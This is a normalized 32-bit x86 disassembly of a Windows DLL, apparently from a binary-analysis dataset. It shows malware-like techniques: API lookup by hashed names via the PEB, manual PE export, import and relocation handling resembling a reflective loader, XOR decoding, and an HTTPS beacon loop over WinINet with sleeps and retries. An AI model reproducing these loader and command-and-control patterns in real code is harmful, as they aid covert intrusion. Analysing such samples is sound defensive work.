lea ecx [ ebp - 0x4 ]
mov [ edi ] eax
push ecx
push eax
push [ ebp + 0x8 ]
call sub_10001103
mov esi eax
add esp 0x10
mov eax [ ebp - 0x4 ]
jmp r-xdata
sub_10001fee
push ebp
mov ebp esp
xor eax eax
push esi
mov esi eax
pop esi
pop ebp
retn
push 0xc8
call [ Sleep@IAT ]
push [ ebp + 0x10 ]
inc esi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10001205
add esp 0xc
cmp esi 0x258
jne r-xdata
test eax eax
jne r-xdata
sub_10002022
push ebp
mov ebp esp
sub esp 0x18
push ebx
push esi
push edi
xor edi edi
lea eax [ ebp - 0x18 ]
mov esi edi
mov [ ebp - 0xc ] edi
push eax
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x18 ] edi
call sub_10002eb4
mov ebx eax
pop ecx
test ebx ebx
je r-xdata
mov ecx [ ebp + 0xc ]
test ecx ecx
je r-xdata
lea eax [ ebp - 0x8 ]
mov [ ebp - 0x8 ] edi
push eax
push ebx
call sub_10001399
pop ecx
pop ecx
cmp [ ebp - 0x8 ] esi
je r-xdata
pop edi
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ecx ] edi
push ebx
call sub_10002f19
mov esi [ ebp - 0x14 ]
pop ecx
push edi
push sub_10002123
push [ ebp - 0x8 ]
push ebx
call sub_1000169b
add esp 0x10
mov [ ebp - 0x10 ] eax
test eax eax
je r-xdata
push [ ebp - 0x8 ]
push ebx
call sub_1000131e
pop ecx
pop ecx
mov ecx edi
mov [ ebp - 0x4 ] ecx
test ecx ecx
je r-xdata
push 0xc8
call [ Sleep@IAT ]
lea eax [ ebp - 0x4 ]
inc esi
push eax
push r--data
call sub_100010d6
pop ecx
pop ecx
mov ecx [ ebp - 0x4 ]
test ecx ecx
je r-xdata
push 0x1d4c0
push [ ebp - 0x10 ]
call [ WaitForSingleObject@IAT ]
push [ ebp - 0x10 ]
mov esi eax
call [ CloseHandle@IAT ]
test esi esi
jne r-xdata
push [ ebp + 0x8 ]
push ecx
call sub_10002290
pop ecx
pop ecx
test eax eax
je r-xdata
cmp esi 0x258
je r-xdata
push [ ebp - 0x4 ]
call sub_10001000
pop ecx
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x14 ]
push eax
push [ ebp - 0x4 ]
call sub_10001f6c
mov edi [ ebp - 0xc ]
add esp 0xc
sub_10002123
push ebp
mov ebp esp
sub esp 0x60
and [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0x8 ]
push eax
push r--data
call sub_1000100e
pop ecx
pop ecx
test eax eax
je r-xdata
xor eax eax
mov esp ebp
pop ebp
retn 0x4
cmp [ ebp - 0x8 ] 0x0
je r-xdata
push ebx
push esi
push edi
push [ ebp - 0x8 ]
lea eax [ ebp - 0x60 ]
push eax
call sub_10001d76
pop ecx
pop ecx
push 0xa
pop ecx
mov esi eax
lea edi [ ebp - 0x38 ]
[ edi ] [ esi ]
xor esi esi
push esi
push esi
push [ ebp - 0x30 ]
push [ ebp - 0x34 ]
push [ ebp - 0x38 ]
call [ InternetOpenA@IAT ]
push esi
push esi
push 0x3
push esi
push esi
push 0x1bb
push [ ebp - 0x2c ]
mov ebx eax
push ebx
call [ InternetConnectA@IAT ]
push [ ebp - 0x28 ]
mov edi eax
call sub_10002ed5
pop ecx
test eax eax
je r-xdata
push esi
push 0x800000
push esi
push esi
push esi
push [ ebp - 0x1c ]
push [ ebp - 0x20 ]
push edi
call [ HttpOpenRequestA@IAT ]
mov esi eax
push esi
call sub_10001e93
push [ ebp - 0x14 ]
call sub_10002ed5
pop ecx
pop ecx
push eax
push [ ebp - 0x14 ]
push 0x0
push 0x0
push esi
call [ HttpSendRequestA@IAT ]
test eax eax
je r-xdata
push [ ebp - 0x24 ]
call sub_10002ed5
pop ecx
test eax eax
je r-xdata
push esi
mov esi [ InternetCloseHandle@IAT ]
call esi
push edi
call esi
push ebx
call esi
lea eax [ ebp - 0x38 ]
push eax
call sub_1000170c
push [ ebp - 0x8 ]
call sub_10001000
pop ecx
pop ecx
pop edi
pop esi
pop ebx
and [ ebp - 0xc ] 0x0
lea eax [ ebp - 0x10 ]
push 0x0
push eax
lea eax [ ebp - 0xc ]
mov [ ebp - 0x10 ] 0x4
push eax
push 0x20000013
push esi
call [ HttpQueryInfoA@IAT ]
cmp [ ebp - 0xc ] 0xc8
mov [ ebp - 0x1 ] 0x34
je r-xdata
push [ ebp - 0x28 ]
call sub_10002ed5
mov esi [ InternetSetOptionA@IAT ]
pop ecx
push eax
push [ ebp - 0x28 ]
push 0x2b
push edi
call esi
push [ ebp - 0x24 ]
call sub_10002ed5
pop ecx
push eax
push [ ebp - 0x24 ]
push 0x2c
push edi
call esi
xor esi esi
mov [ ebp - 0x1 ] 0x32
cmp [ ebp - 0xc ] 0x194
jne r-xdata
push 0x1
lea eax [ ebp - 0x1 ]
push eax
push [ ebp - 0x8 ]
call sub_10001fee
add esp 0xc
sub_10002290
push ebp
mov ebp esp
push ecx
push ecx
push edi
xor edi edi
cmp [ ebp + 0x8 ] edi
je r-xdata
mov eax edi
pop edi
mov esp ebp
pop ebp
retn
push ebx
mov ebx [ ebp + 0xc ]
cmp [ ebx ] edi
je r-xdata
pop ebx
cmp [ ebx + 0xc ] edi
je r-xdata
cmp [ ebx + 0x18 ] edi
je r-xdata
cmp [ ebx + 0x1c ] edi
je r-xdata
cmp [ ebx + 0x24 ] edi
je r-xdata
push esi
push 0x50
call sub_10002b17
push [ ebx ]
mov esi eax
call sub_10002ed5
xor ecx ecx
lea edx [ eax + 0x1 ]
mov eax [ ebx ]
test eax eax
mov [ esi ] eax
lea eax [ ebx + 0x4 ]
cmovne ecx edx
mov [ esi + 0x4 ] ecx
mov [ esi + 0x8 ] eax
neg eax
sbb eax eax
and eax 0x4
mov [ esi + 0xc ] eax
push [ ebx + 0x8 ]
call sub_10002ed5
xor ecx ecx
lea edx [ eax + 0x1 ]
mov eax [ ebx + 0x8 ]
test eax eax
mov [ esi + 0x10 ] eax
cmovne ecx edx
mov [ esi + 0x14 ] ecx
push [ ebx + 0xc ]
call sub_10002ed5
xor ecx ecx
lea edx [ eax + 0x1 ]
mov eax [ ebx + 0xc ]
test eax eax
mov [ esi + 0x18 ] eax
cmovne ecx edx
mov [ esi + 0x1c ] ecx
push [ ebx + 0x10 ]
call sub_10002ed5
xor ecx ecx
lea edx [ eax + 0x1 ]
mov eax [ ebx + 0x10 ]
test eax eax
mov [ esi + 0x20 ] eax
cmovne ecx edx
mov [ esi + 0x24 ] ecx
push [ ebx + 0x14 ]
call sub_10002ed5
xor ecx ecx
lea edx [ eax + 0x1 ]
mov eax [ ebx + 0x14 ]
test eax eax
mov [ esi + 0x28 ] eax
cmovne ecx edx
mov [ esi + 0x2c ] ecx
push [ ebx + 0x18 ]
call sub_10002ed5
xor ecx ecx
lea edx [ eax + 0x1 ]
mov eax [ ebx + 0x18 ]
test eax eax
mov [ esi + 0x30 ] eax
cmovne ecx edx
mov [ esi + 0x34 ] ecx
push [ ebx + 0x1c ]
call sub_10002ed5
xor ecx ecx
lea edx [ eax + 0x1 ]
mov eax [ ebx + 0x1c ]
test eax eax
mov [ esi + 0x38 ] eax
cmovne ecx edx
mov [ esi + 0x3c ] ecx
push [ ebx + 0x20 ]
call sub_10002ed5
xor ecx ecx
lea edx [ eax + 0x1 ]
mov eax [ ebx + 0x20 ]
test eax eax
mov [ esi + 0x40 ] eax
cmovne ecx edx
mov [ esi + 0x44 ] ecx
push [ ebx + 0x24 ]
call sub_10002ed5
xor ecx ecx
mov [ ebp - 0x4 ] edi
lea edx [ eax + 0x1 ]
mov eax [ ebx + 0x24 ]
test eax eax
mov [ esi + 0x48 ] eax
lea eax [ ebp - 0x4 ]
mov ebx esi
push eax
cmovne ecx edx
push 0xa
push ebx
mov [ esi + 0x4c ] ecx
call sub_10001ece
mov esi eax
add esp 0x34
test esi esi
je r-xdata
push ebx
call sub_10002c4c
pop ecx
pop esi
push [ ebp - 0x4 ]
push esi
push [ ebp + 0x8 ]
call sub_10001fee
xor ecx ecx
inc ecx
test eax eax
push esi
cmovne edi ecx
call sub_10002c4c
add esp 0x10
sub_10002423
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
xor edi edi
test esi esi
je r-xdata
mov eax edi
pop edi
pop esi
pop ebp
retn
push ebx
mov ebx edi
mov al [ esi ]
test al al
je r-xdata
cmp ebx [ ebp + 0xc ]
jae r-xdata
pop ebx
cmp [ ebp + 0x10 ] 0x0
mov [ ebp + 0xb ] al
je r-xdata
imul ecx edi 0x19660d
movzx eax al
lea edi [ eax + 0x3c6ef35f ]
add edi ecx
inc ebx
inc esi
jmp r-xdata
lea eax [ ebp + 0xb ]
push eax
call sub_100024cf
mov al [ ebp + 0xb ]
pop ecx
cmp [ ebp + 0xc ] 0x0
je r-xdata
sub_10002477
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
xor edi edi
test esi esi
je r-xdata
mov eax edi
pop edi
pop esi
pop ebp
retn
push ebx
mov ebx edi
movzx eax [ esi ]
test ax ax
je r-xdata
cmp ebx [ ebp + 0xc ]
jae r-xdata
pop ebx
cmp [ ebp + 0x10 ] 0x0
mov [ ebp + 0x8 ] eax
je r-xdata
imul ecx edi 0x19660d
movzx edi al
add edi 0x3c6ef35f
add edi ecx
inc ebx
add esi 0x2
jmp r-xdata
lea eax [ ebp + 0x8 ]
push eax
call sub_100024e8
mov eax [ ebp + 0x8 ]
pop ecx
cmp [ ebp + 0xc ] 0x0
je r-xdata
sub_10002503
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
xor ecx ecx
test edx edx
je r-xdata
mov eax ecx
pop ebp
retn
mov ecx edx
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
sub ecx edx
dec ecx
sub_1000251f
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
xor edi edi
test esi esi
je r-xdata
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ esi ] 0x0
je r-xdata
push esi
call sub_10002503
mov dl [ ebp + 0xc ]
pop ecx
lea ecx [ esi - 0x1 ]
add ecx eax
inc ecx
cmp [ ecx ] dl
cmove edi ecx
cmp ecx esi
jae r-xdata
mov al [ ecx ]
dec ecx
cmp al dl
je r-xdata
sub_10002558
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
xor ecx ecx
test edx edx
je r-xdata
mov eax ecx
pop ebp
retn
jmp r-xdata
mov al [ edx ]
cmp al 0x30
jge r-xdata
cmp al 0x39
jg r-xdata
imul ecx ecx 0xa
movsx eax al
add ecx 0xffffffd0
add ecx eax
inc edx
sub_10002580
push ebp
mov ebp esp
push ecx
push edi
xor edi edi
cmp [ ebp + 0x8 ] edi
je r-xdata
mov eax edi
pop edi
mov esp ebp
pop ebp
retn
push ebx
mov ebx [ ebp + 0xc ]
test ebx ebx
je r-xdata
pop ebx
mov eax [ fs : 0x30 ]
push esi
mov eax [ eax + 0xc ]
add eax 0xc
mov [ ebp - 0x4 ] eax
mov esi [ eax ]
pop esi
push [ ebp + 0x10 ]
movzx eax [ esi + 0x2c ]
push eax
push [ esi + 0x30 ]
call sub_10002477
add esp 0xc
cmp eax [ ebp + 0x8 ]
je r-xdata
xor edi edi
mov [ esi + 0x18 ] ebx
inc edi
mov esi [ esi ]
mov eax [ ebp - 0x4 ]
jmp r-xdata
cmp esi eax
je r-xdata
sub_100025d8
push ebp
mov ebp esp
xor eax eax
cmp [ ebp + 0x8 ] eax
je r-xdata
pop ebp
retn
push ebx
xor ebx ebx
cmp [ ebp + 0x10 ] eax
sete bl
push ebx
push eax
push [ ebp + 0x8 ]
call sub_10002423
push ebx
push [ ebp + 0xc ]
push eax
call sub_10002580
add esp 0x18
pop ebx
sub_10002605
push ebp
mov ebp esp
sub esp 0xc
push ebx
mov ebx [ ebp + 0x8 ]
push ebx
call sub_10002503
pop ecx
test eax eax
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
and [ ebp - 0x8 ] 0x0
lea eax [ ebp + 0x8 ]
push esi
push edi
xor edi edi
mov [ ebp - 0x4 ] eax
inc edi
mov [ ebp - 0xc ] edi
add eax 0x4
push 0x1
push r--data
mov [ ebp - 0x4 ] eax
mov ebx [ eax ]
push ebx
call sub_10002b2e
add esp 0xc
test eax eax
mov eax [ ebp - 0x4 ]
je r-xdata
push ebx
call sub_10002503
mov esi eax
add edi esi
push edi
push [ ebp - 0x8 ]
call sub_10002c6a
mov ecx [ ebp - 0xc ]
push esi
dec ecx
mov [ ebp - 0x8 ] eax
add ecx eax
push ebx
push ecx
call sub_10002bb6
mov eax [ ebp - 0x4 ]
add esp 0x18
mov [ ebp - 0xc ] edi
test ebx ebx
je r-xdata
mov eax [ ebp - 0x8 ]
pop edi
pop esi
sub_10002686
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
xor eax eax
test ecx ecx
mov edx sub_10002686
cmove ecx edx
and ecx 0xffff0000
sub ecx 0x1000
test eax eax
je r-xdata
mov edx [ ecx + 0x3c ]
cmp edx 0x300
jae r-xdata
mov edx 0x5a4d
cmp [ ecx ] dx
jne r-xdata
pop ebp
retn
cmp [ edx + ecx ] 0x4550
cmove eax ecx
sub_100026c9
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov ebx 0xcdcb4e50
push edi
test esi esi
je r-xdata
xor edi edi
inc edi
push edi
push ebx
call sub_1000274f
pop ecx
pop ecx
test eax eax
jne r-xdata
mov [ esi ] ebx
pop edi
pop esi
pop ebx
pop ebp
retn
push edi
push ebx
call sub_10002910
pop ecx
pop ecx
test eax eax
jne r-xdata
mov ebx 0x70297938
test esi esi
je r-xdata
push edi
push ebx
call sub_1000274f
pop ecx
pop ecx
test eax eax
jne r-xdata
mov [ esi ] ebx
push edi
push ebx
call sub_10002910
pop ecx
pop ecx
test eax eax
jne r-xdata
mov ebx 0x723f0158
test esi esi
je r-xdata
push edi
push ebx
call sub_1000274f
pop ecx
pop ecx
test eax eax
jne r-xdata
mov [ esi ] ebx
push edi
push ebx
call sub_10002910
pop ecx
pop ecx
test eax eax
jne r-xdata
test esi esi
je r-xdata
and [ esi ] eax
sub_1000274f
push ebp
mov ebp esp
sub esp 0xc
push ebx
push esi
lea eax [ ebp - 0x4 ]
xor esi esi
and [ ebp - 0x4 ] esi
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10002969
mov edx [ ebp - 0x4 ]
add esp 0xc
mov ebx eax
xor ecx ecx
mov [ ebp - 0xc ] ebx
test edx edx
je r-xdata
push ebx
call sub_10002c4c
pop ecx
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebx + 0x8 ]
mov ebx eax
mov [ ebp - 0x8 ] eax
push edi
mov edi ebx
mov ebx [ ebp - 0xc ]
pop edi
and [ ebp - 0x4 ] esi
mov eax ebx
mov ebx [ edi ]
mov ebx [ ebp - 0x8 ]
add edi 0x10
inc ecx
cmp ecx edx
jb r-xdata
cmp ebx [ eax + 0x4 ]
jne r-xdata
test esi esi
jne r-xdata
add eax 0x10
inc [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] edx
jb r-xdata
mov esi [ eax ]
test esi esi
jne r-xdata
sub_100027c6
push ebp
mov ebp esp
push edi
xor edi edi
cmp [ ebp + 0x8 ] edi
je r-xdata
mov eax edi
pop edi
pop ebp
retn
mov eax [ fs : 0x30 ]
test eax eax
je r-xdata
push ebx
mov ebx [ eax + 0xc ]
add ebx 0xc
push esi
mov esi [ ebx ]
pop esi
pop ebx
movzx eax [ esi + 0x2c ]
xor ecx ecx
cmp [ ebp + 0x10 ] eax
ja r-xdata
cmp ecx [ ebp + 0x8 ]
jne r-xdata
push [ ebp + 0xc ]
push [ ebp + 0x10 ]
push [ esi + 0x30 ]
call sub_10002477
add esp 0xc
mov ecx eax
mov esi [ esi ]
mov edi [ esi + 0x18 ]
jmp r-xdata
cmp esi ebx
je r-xdata
test edi edi
je r-xdata
sub_1000281e
push ebp
mov ebp esp
sub esp 0x14
push esi
push edi
mov edi [ ebp + 0x8 ]
xor esi esi
test edi edi
je r-xdata
pop edi
mov eax esi
pop esi
mov esp ebp
pop ebp
retn
mov edx [ ebp + 0xc ]
test edx edx
je r-xdata
mov eax 0x5a4d
cmp [ edi ] ax
jne r-xdata
mov ecx [ edi + 0x3c ]
cmp [ ecx + edi ] 0x4550
jne r-xdata
mov eax [ ecx + edi + 0x78 ]
mov ecx [ ecx + edi + 0x7c ]
mov [ ebp - 0x14 ] ecx
push ebx
lea ecx [ eax + edi ]
or ebx 0xffffffff
mov eax edx
mov [ ebp - 0x10 ] ecx
shr eax 0x10
test ax ax
jne r-xdata
mov eax [ ecx + 0x24 ]
mov edx [ ecx + 0x20 ]
add eax edi
add edx edi
mov [ ebp - 0x8 ] eax
mov eax [ ecx + 0x18 ]
mov [ ebp + 0x8 ] edx
mov [ ebp - 0xc ] eax
mov [ ebp - 0x4 ] esi
test eax eax
je r-xdata
movzx ebx dx
sub ebx [ ecx + 0x10 ]
jmp r-xdata
pop ebx
mov esi [ ebp - 0x8 ]
test ebx ebx
js r-xdata
mov ecx [ ebp - 0x10 ]
xor esi esi
push [ ebp + 0x10 ]
mov eax [ edx ]
push [ ebp + 0x14 ]
add eax edi
push eax
call sub_10002423
mov edx [ ebp + 0x8 ]
add esp 0xc
cmp eax [ ebp + 0xc ]
jne r-xdata
mov eax [ ecx + 0x1c ]
lea eax [ eax + ebx * 4 ]
mov esi [ eax + edi ]
add esi edi
cmp esi ecx
jbe r-xdata
add edx 0x4
add esi 0x2
mov [ ebp + 0x8 ] edx
movzx ebx [ esi ]
jmp r-xdata
mov eax [ ebp - 0x14 ]
add eax ecx
cmp esi eax
jae r-xdata
cmp ebx 0xffffffff
jne r-xdata
mov eax [ ebp - 0x4 ]
inc eax
mov [ ebp - 0x4 ] eax
cmp eax [ ebp - 0xc ]
jb r-xdata
push esi
call sub_10002a27
pop ecx
mov esi eax
sub_10002910
push ebp
mov ebp esp
push ecx
push ebx
xor ebx ebx
cmp [ ebp + 0x8 ] ebx
je r-xdata
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
push edi
push 0x5
call sub_10002a92
mov edi eax
pop ecx
test edi edi
je r-xdata
pop edi
push esi
mov esi edi
push edi
call sub_10002c4c
pop ecx
pop esi
push [ ebp + 0xc ]
movzx eax [ esi + 0x38 ]
push eax
push [ esi + 0x3c ]
call sub_10002477
add esp 0xc
cmp eax [ ebp + 0x8 ]
jne r-xdata
add esi [ ebp - 0x4 ]
test ebx ebx
je r-xdata
mov ebx [ esi + 0x44 ]
mov eax [ esi ]
mov [ ebp - 0x4 ] eax
test eax eax
je r-xdata
sub_10002969
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x10 ]
xor esi esi
test edi edi
je r-xdata
pop edi
mov eax esi
pop esi
pop ebp
retn
and [ edi ] esi
push ebx
push 0x5
call sub_10002a92
mov ebx eax
pop ecx
test ebx ebx
je r-xdata
pop ebx
cmp [ ebx ] 0x0
mov esi ebx
je r-xdata
mov eax [ edi ]
shl eax 0x4
push eax
call sub_10002b17
cmp [ ebx ] 0x0
mov esi ebx
pop ecx
mov [ ebp + 0x10 ] eax
je r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push ebx
call sub_10002c4c
mov esi [ ebp + 0x10 ]
pop ecx
lea edi [ eax + 0xc ]
inc [ edi ]
push [ ebp + 0xc ]
movzx eax [ esi + 0x38 ]
push eax
push [ esi + 0x3c ]
call sub_10002477
add esp 0xc
cmp eax [ ebp + 0x8 ]
jne r-xdata
mov eax [ esi + 0x38 ]
mov [ edi - 0xc ] eax
mov eax [ esi + 0x3c ]
mov [ edi - 0x8 ] eax
mov eax [ esi + 0x44 ]
mov [ edi - 0x4 ] eax
mov eax [ esi + 0x48 ]
mov [ edi ] eax
add edi 0x10
push [ ebp + 0xc ]
movzx eax [ esi + 0x38 ]
push eax
push [ esi + 0x3c ]
call sub_10002477
add esp 0xc
cmp eax [ ebp + 0x8 ]
jne r-xdata
add esi [ esi ]
cmp [ esi ] 0x0
jne r-xdata
add esi [ esi ]
cmp [ ebp + 0x8 ] 0x0
je r-xdata
cmp [ esi ] 0x0
jne r-xdata
sub_10002a27
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push edi
xor edi edi
test ebx ebx
je r-xdata
mov eax edi
pop edi
pop ebx
pop ebp
retn
push esi
push 0x2e
push ebx
call sub_1000251f
pop ecx
pop ecx
mov esi eax
sub eax ebx
push eax
push 0x1
push 0x1
push eax
push ebx
call sub_10002423
add esp 0xc
push eax
call sub_100027c6
add esp 0xc
mov ebx eax
inc esi
cmp [ esi ] 0x23
jne r-xdata
push 0x1
push edi
push esi
call sub_10002423
add esp 0xc
lea eax [ esi + 0x1 ]
push eax
call sub_10002558
pop ecx
jmp r-xdata
push edi
push 0x1
push eax
push ebx
call sub_1000281e
add esp 0x10
mov edi eax
pop esi
sub_10002a92
push ebp
mov ebp esp
push ecx
push esi
xor esi esi
push esi
push 0x1
push 0xa4137e37
call sub_100027c6
add esp 0xc
test eax eax
je r-xdata
mov eax esi
pop esi
mov esp ebp
pop ebp
retn
push ebx
push esi
push 0x1
push 0xa2ea8afa
push eax
call sub_1000281e
mov ebx eax
add esp 0x10
test ebx ebx
je r-xdata
pop ebx
push edi
mov edi 0x8000
push esi
call sub_10002c6a
pop ecx
call sub_10002b17
jmp r-xdata
xor edi edi
add edi edi
jmp r-xdata
and [ ebp - 0x4 ] 0x0
mov esi eax
pop ecx
lea eax [ ebp - 0x4 ]
push eax
push edi
push esi
push [ ebp + 0x8 ]
call ebx
cmp eax 0xc0000004
jne r-xdata
push edi
test esi esi
jne r-xdata
pop edi
test eax eax
je r-xdata
test edi edi
jne r-xdata
push esi
call sub_10002c4c
pop ecx
xor esi esi
sub_10002b2e
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
push ebx
mov ebx [ ebp + 0x10 ]
mov ecx ebx
push esi
mov esi [ ebp + 0xc ]
push edi
xor edi edi
shr ecx 0x2
mov [ ebp + 0x8 ] edi
mov eax edi
test ecx ecx
je r-xdata
and ebx 0x3
jbe r-xdata
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub esi edx
mov edi [ esi ]
cmp [ edx ] edi
mov ebx [ ebp + 0x10 ]
push eax
pop edi
je r-xdata
mov cl [ edx ]
mov ch [ esi + edx ]
cmp cl ch
je r-xdata
add edx 0x4
add esi 0x4
inc [ ebp + 0x8 ]
cmp [ ebp + 0x8 ] ecx
jb r-xdata
mov eax [ edx ]
sub eax [ esi ]
and [ ebp + 0xc ] 0x0
cmp [ ebp + 0xc ] eax
sbb eax eax
and eax 0x2
dec eax
inc edx
inc edi
cmp edi ebx
jb r-xdata
movzx eax ch
movzx ecx cl
sub ecx eax
mov [ ebp + 0x10 ] 0x1
or eax 0xffffffff
test ecx ecx
cmovg eax [ ebp + 0x10 ]
test eax eax
jne r-xdata
test eax eax
jne r-xdata
sub_10002bb6
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0x8 ]
test edi edi
je r-xdata
mov eax edi
pop edi
pop ebp
retn
push esi
mov esi [ ebp + 0xc ]
test esi esi
je r-xdata
pop esi
mov edx [ ebp + 0x10 ]
test edx edx
je r-xdata
push ebx
cmp edi esi
jbe r-xdata
mov ecx edx
mov ebx edi
shr ecx 0x2
test ecx ecx
je r-xdata
lea eax [ esi + edx ]
cmp edi eax
ja r-xdata
push 0x0
pop eax
and edx 0x3
jbe r-xdata
mov eax [ esi ]
add esi 0x4
mov [ ebx ] eax
add ebx 0x4
sub ecx 0x1
jne r-xdata
mov ebx edx
lea ecx [ edi - 0x4 ]
shr ebx 0x2
lea esi [ esi + ebx * 4 ]
add esi 0xfffffffc
lea ecx [ ecx + ebx * 4 ]
test ebx ebx
je r-xdata
pop ebx
mov cl [ eax + esi ]
mov [ eax + ebx ] cl
inc eax
cmp eax edx
jb r-xdata
and edx 0x3
jbe r-xdata
mov eax [ esi ]
sub esi 0x4
mov [ ecx ] eax
sub ecx 0x4
sub ebx 0x1
jne r-xdata
sub esi ecx
mov al [ esi + ecx ]
mov [ ecx ] al
dec ecx
sub edx 0x1
jne r-xdata
jmp r-xdata
sub_10002c6a
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
push [ ebp + 0xc ]
call sub_10002b17
cmp [ ebp + 0xc ] 0x0
jne r-xdata
push [ ebp + 0xc ]
push eax
push 0x8
call [ GetProcessHeap@IAT ]
push eax
call [ HeapReAlloc@IAT ]
pop ebp
retn
push eax
call sub_10002c4c
xor eax eax
jmp r-xdata
pop ecx
pop ebp
retn
sub_10002ca4
push ebp
mov ebp esp
push esi
xor esi esi
cmp [ ebp + 0x8 ] esi
je r-xdata
mov eax esi
pop esi
pop ebp
retn
cmp [ ebp + 0xc ] esi
je r-xdata
push [ ebp + 0xc ]
call sub_10002b17
push [ ebp + 0xc ]
mov esi eax
push [ ebp + 0x8 ]
push esi
call sub_10002bb6
add esp 0x10
sub_10002cd2
push ebp
mov ebp esp
sub esp 0x1c
push esi
push edi
xor edi edi
push edi
push 0x1
push 0x98853a78
call sub_100027c6
mov esi eax
add esp 0xc
test esi esi
je r-xdata
mov eax edi
pop edi
pop esi
mov esp ebp
pop ebp
retn
push ebx
push edi
push 0x1
push 0x3b66d24c
push esi
call sub_1000281e
push edi
push 0x1
mov ebx eax
push 0x79f5d836
push esi
mov [ ebp - 0xc ] ebx
call sub_1000281e
add esp 0x20
mov [ ebp - 0x18 ] eax
test ebx ebx
je r-xdata
pop ebx
test eax eax
je r-xdata
mov ebx [ ebp + 0x8 ]
test ebx ebx
je r-xdata
mov eax 0x5a4d
cmp [ ebx ] ax
jne r-xdata
mov eax [ ebx + 0x3c ]
cmp [ eax + ebx ] 0x4550
jne r-xdata
mov ecx [ eax + ebx + 0x80 ]
xor edx edx
mov eax [ eax + ebx + 0x84 ]
add ecx ebx
push 0x14
pop esi
div esi
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x14 ] edi
test eax eax
je r-xdata
xor edi edi
inc edi
mov ecx [ ecx + 0xc ]
test ecx ecx
je r-xdata
lea esi [ ecx + ebx ]
push esi
call [ ebp - 0x18 ]
push edi
push eax
push esi
mov [ ebp - 0x8 ] eax
call sub_100025d8
mov ecx [ ebp - 0x4 ]
add esp 0xc
mov esi [ ecx + 0x10 ]
mov eax [ ecx ]
add esi ebx
add eax ebx
mov [ ebp - 0x10 ] eax
cmp [ esi ] edi
je r-xdata
mov eax [ ebp - 0x14 ]
add ecx 0x14
inc eax
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x14 ] eax
cmp eax [ ebp - 0x1c ]
jb r-xdata
mov eax [ eax ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
js r-xdata
movzx eax ax
add eax 0x2
add eax ebx
jmp r-xdata
push eax
push [ ebp - 0x8 ]
call [ ebp - 0xc ]
mov [ esi ] eax
add esi 0x4
mov eax [ ebp - 0x10 ]
add eax 0x4
mov [ ebp - 0x10 ] eax
cmp [ esi ] edi
jne r-xdata
sub_10002df6
push ebp
mov ebp esp
sub esp 0xc
xor eax eax
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
mov esp ebp
pop ebp
retn
push ebx
mov ebx [ ebp + 0xc ]
test ebx ebx
je r-xdata
pop ebx
mov ecx 0x5a4d
cmp [ esi ] cx
jne r-xdata
mov edx [ esi + 0x3c ]
add edx esi
mov [ ebp - 0xc ] edx
cmp [ edx ] 0x4550
jne r-xdata
mov eax ebx
sub eax [ edx + 0x34 ]
mov [ ebp + 0x8 ] eax
je r-xdata
xor eax eax
inc eax
mov eax [ edx + 0xa4 ]
push edi
mov edi [ edx + 0xa0 ]
add edi esi
add eax edi
mov [ ebp - 0x8 ] eax
cmp edi eax
jae r-xdata
mov [ edx + 0x34 ] ebx
pop edi
mov ebx [ ebp + 0x8 ]
add edi [ eax ]
cmp edi [ ebp - 0x8 ]
jb r-xdata
movzx eax [ edx ]
mov [ ebp + 0xa ] ax
shr [ ebp + 0xa ] 0xc
cmp [ ebp + 0xa ] 0x3
je r-xdata
lea eax [ edi + 0x4 ]
mov ecx [ eax ]
lea edx [ edi + 0x8 ]
sub ecx 0x8
mov [ ebp - 0x4 ] eax
shr ecx 0x1
je r-xdata
mov edx [ ebp - 0xc ]
mov ebx [ ebp + 0xc ]
and eax 0xfff
add eax [ edi ]
add [ eax + esi ] ebx
cmp [ ebp + 0xa ] 0xa
jne r-xdata
mov eax [ ebp - 0x4 ]
add edx 0x2
sub ecx 0x1
jne r-xdata
sub_10002eb4
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
xor esi esi
call sub_100026c9
pop ecx
test eax eax
je r-xdata
mov eax esi
pop esi
pop ebp
retn
push eax
call sub_10002f64
pop ecx
mov esi eax
sub_10002ede
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
mov eax esi
pop esi
pop ebp
retn
push edi
mov edi [ ebp + 0x10 ]
test edi edi
je r-xdata
pop edi
cmp [ ebp + 0xc ] 0x0
push ebx
mov ebx esi
jbe r-xdata
pop ebx
xor esi esi
xor edx edx
mov eax esi
div [ ebp + 0x14 ]
mov cl [ edx + edi ]
xor [ ebx ] cl
inc ebx
inc esi
cmp esi [ ebp + 0xc ]
jb r-xdata
mov esi [ ebp + 0x8 ]
sub_10002f19
push ebp
mov ebp esp
push esi
xor esi esi
